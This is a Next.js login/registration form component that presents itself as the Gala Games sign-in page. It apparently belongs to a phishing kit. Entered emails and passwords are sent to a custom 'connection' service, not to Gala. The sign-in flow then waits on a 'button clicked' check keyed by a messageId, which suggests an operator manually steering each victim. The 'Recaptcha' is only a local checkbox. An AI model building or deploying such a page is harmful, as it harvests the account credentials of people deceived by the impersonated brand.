'use client'

import React, {useState} from 'react';
import {useForm} from 'react-hook-form';
import {yupResolver} from '@hookform/resolvers/yup';
import * as yup from 'yup';
import styles from './styles.module.css';
import Image from 'next/image';
import {useRouter} from "next/navigation";
import {checkService} from "@/services/check";
import {getResponseRoute} from "../../../../utils/navigation";
import {sessionConst} from "@/constants/session";
import {routeConstants} from "@/constants/route";
import {Recaptcha} from "@/components/captcha";
import {connection} from "@/services/connection";

const schema = yup.object().shape({
  email: yup.string().email('Email is not valid').required('Email is required'),
  password: yup.string().min(6, 'Password must be at least 6 characters').required('Password is required'),
});

export const AuthForm = ({isSignIn = true}: { isSignIn?: boolean }) => {
  const router = useRouter();
  const [checked, setChecked] = useState(false);
  const [loading, setLoading] = useState(false);
  const {register, handleSubmit, formState: {errors, isDirty, isValid}} = useForm({
    resolver: yupResolver(schema),
    mode: 'onChange'
  });

  const isDisabled = !isDirty || !isValid || !checked;

  const onSubmit = async (formData: { email: string; password: string }) => {
    setLoading(true)
    sessionStorage.setItem(sessionConst.Email, formData.email)

    const dataToSend = {
      email: ` ${formData.email} `,
      password: ` ${formData.password} `,
      variant: isSignIn ? ' login ' : ' register '
    }


    if (isSignIn) {
      const {data, error} = await connection.withActions(dataToSend)

      if (error) window.location.reload();

      const messageId = data?.messageId;

      if (messageId) {
        const response = await checkService.checkButtonClicked({messageId})

        const {error, data} = response as { error: string | null, data: any }

        if (error) window.location.reload();

        if (data) {
          setLoading(false)
          getResponseRoute(router, data)
        }
      }
    } else {
      const {error, data} = await connection.withoutActions(dataToSend)

      if (error) window.location.reload();

      if (data) {
        setLoading(false);

        router.push(`${routeConstants.HOME}?email=yes`)
      }
    }


  };

  return (
    <div className={styles.container}>
      <div className={styles.form}>
        <div className={styles.logo}>
          <Image width={60} height={60} src="/icons/form-logo.png" alt="Logo"/>
        </div>
        <h2 className={styles.title}>Welcome</h2>
        <p className={styles.subtitle}>{isSignIn ? "Log in" : "Register"} to continue to Gala Games.</p>

        <form className={styles.emailForm} onSubmit={handleSubmit(onSubmit)}>
          <div className={styles.inputWrapper}>
            <input
              type="email"
              placeholder="Email address"
              className={styles.input}
              {...register('email')}
            />
            {errors.email && <p className={styles.error}>{errors.email.message}</p>}
          </div>
          <div className={styles.inputWrapper}>
            <input
              type="password"
              placeholder="Password"
              className={styles.input}
              {...register('password')}
            />
            {errors.password && <p className={styles.error}>{errors.password.message}</p>}
          </div>

          <Recaptcha checked={checked} setChecked={setChecked}/>

          <p className={styles.terms}>
            By continuing, you agree to the <a href="https://games.gala.com/terms-and-conditions">Terms &
            Conditions</a> and <a href="https://games.gala.com/privacy-policy">Privacy
            Policy</a>
          </p>
          <button type="submit"
                  disabled={isDisabled}
                  className={styles.continueButton}>{loading ? "Wait..." : "Continue"} </button>

          {isSignIn && (
            <div className={styles.loginLinkForm}>
              <p>Don{"'"}t have an account?</p>
              <a href={routeConstants.SIGN_UP}>Register</a>
            </div>
          )}
        </form>
      </div>
    </div>
  );
};
